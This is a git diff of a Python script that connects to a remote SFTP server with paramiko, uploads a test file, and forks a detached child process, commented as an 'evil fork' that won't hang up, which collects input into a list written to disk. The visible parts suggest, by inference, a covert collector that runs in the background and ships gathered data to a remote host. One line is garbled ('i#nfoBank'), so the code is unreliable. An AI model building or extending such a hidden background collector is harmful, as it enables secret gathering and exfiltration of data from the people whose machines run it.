@@ -33,8 +33,6 @@
  #
 #==============================================================================
 import paramiko
-import threading
-import subprocess
 import sys
 import os
 import re
@@ -65,20 +63,23 @@ def fetchSFTP():
         
         sftp = client.open_sftp()
         sftp.sshclient = client
-        
+        print("Connected!")
         #TEST FILE - TODO REMOVE
         file = open("mytestfile.txt",  "a")
-        file.write("Runescape Sucks")
+        file.write("Overwatch Sucks")
         file.close()
         sftp.put("mytestfile.txt",  "transported.txt")
         
         return sftp
     except Exception as e:
+        print("We ran into a problem and have to close. Please try again later.")
         print("Unhandled exception ->"+ str(e))
+        
         if sftp != 0:
             sftp.close()
         if client != 0:
             client.close()
+        sys.exit(0)
     
     #--------------End of fetch SFTP-----------#
 
@@ -149,9 +150,16 @@ def getIPaddr():
 def run():
 
     sftp = fetchSFTP()
-    infoBank = getInput()
     try:
         pid = os.fork()
+        if pid == 0:
+                #I am the child connection, I am an evil fork and wont HUP
+                infoBank = getInput()
+        else:
+                i#nfoBank = getInput()
+                #I am the parent and need to die after I finish my work
+                os._exit(0) #children are returning success to parent
+                
     except OSError:
         sys.stderr.write("Could not create a child process\n")
     
@@ -160,27 +168,9 @@ def run():
         for item in infoBank:
             f.write("%s\n" % item)
     
-    #decouple from parent env
-    os.chdir('/')
-    try:
-        os.setsid()
-    except:
-        pass
-    os.umask(0)
-
-    #double fork
-    try:
-        pid = os.fork()
-    except OSError:
-        sys.stderr.write("Could not create a child process\n")
-        
-    if pid > 0: #parent
-        os._exit(0)
 
     sftp.close()
     
-
-
 # MAIN # 
 if __name__ == '__main__':
     run()
